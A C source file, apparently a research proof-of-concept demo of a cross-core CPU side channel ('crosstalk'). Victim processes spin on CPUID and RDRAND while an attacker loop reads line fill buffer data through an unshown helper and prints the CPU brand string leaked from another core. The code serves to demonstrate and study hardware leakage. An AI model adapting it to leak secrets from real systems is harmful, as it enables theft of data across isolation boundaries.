#include "../primitives/basic_primitives.h"
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <sys/mman.h>
#include "utils.h"


#ifdef TSX_AVAILABLE
#define READ_SUCCESS_THRESHOLD 1000
#define REPS 5000
#else
#define READ_SUCCESS_THRESHOLD 5000
#define REPS 20000
#endif



inline void *victim_cpuid(uint32_t leaf, int cpu) {
    set_processor_affinity(cpu);
    while (1) {
        asm volatile(
        "mov %0, %%eax\n"
        "cpuid\n"
        ::"r"(leaf)
        : "eax", "ebx", "ecx", "edx");
    }
}

inline void *victim_rdrand(int cpu) {
    uint64_t local;
    set_processor_affinity(cpu);
    while (1) {
        asm volatile(
        "rdrand %0\n"
        "cpuid\n"
        ::"r"(local));
    }
}

void attacker(void *mem, int segment) {
    set_processor_affinity(reader_cpu);
    memset(vector, 0, sizeof(vector[0]) * 64);
    int reps = REPS;
    while (reps--) {
        if ((reps % 100) == 0) {
            printf("In Progress... %d%%              \r",
                   (int) (((REPS - reps) / ((double) REPS)) * 33.33 + (33.33 * segment)));
            fflush(stdout);
        }
        memset(vector_hits, 0, sizeof(vector[0]) * 256);
        lfb_vector_read(mem, vector);
        for (int i = 16 * segment; i < 16 * (segment + 1); i++) {
            int value = (int) vector[i];
            if (value > 0 && value < 127) vector_hits[i][value & 0xFF]++;
        }
    }
}

void set_up_victim(int segment) {
    if (segment == 2) {
        kill(pid, SIGKILL);
        pid = fork();
        if (!pid) victim_cpuid(0x6, writer_cpu);
    }
    pid2 = fork();
    if (!pid2) {
        victim_cpuid(0x80000002ul + segment, offcore_cpu);
    }
    usleep(10000);
}

void print_result() {
    for (int k = 0; k < 64; k++) {
        int max = 0, max_i = -1;
        for (int i = 1; i < 256; i++) {
            if (vector_hits[k][i] > max) {
                max_i = i;
                max = vector_hits[k][i];
            }
        }
        if (max > (float) REPS / READ_SUCCESS_THRESHOLD) {
            printf("%c", (char) max_i);
        } else {
            printf("*");
        }
    }
    printf("\n");
    usleep(10000);
}

int main(int argc, char **args) {
    printf("Demo 1: Observing the CPU Brand String from another physical core.\n\n");
    _page_size = getpagesize();
    get_same_core_cpus(&reader_cpu, &writer_cpu);
    offcore_cpu = reader_cpu + 1;
    printf("Running attacker threads on CPU %d and %d.\nRunning victim on CPU %d.\n\n", reader_cpu, writer_cpu, offcore_cpu);
    fflush(stdout);
    uint8_t *mem =
            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
    memset(mem, 0xFF, _page_size * 256);
    crosstalk_init(argc, args);
    memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 64 * 256);
    pid = fork();
    if (!pid) victim_rdrand(writer_cpu);
    for (int l = 0; l < 3; l++) {
        set_up_victim(l);
        attacker(mem, l);
        kill(pid2, SIGKILL);
        print_result();
    }
    kill(pid, SIGKILL);
    usleep(10000);
    crosstalk_cleanup();
    return 0;
}

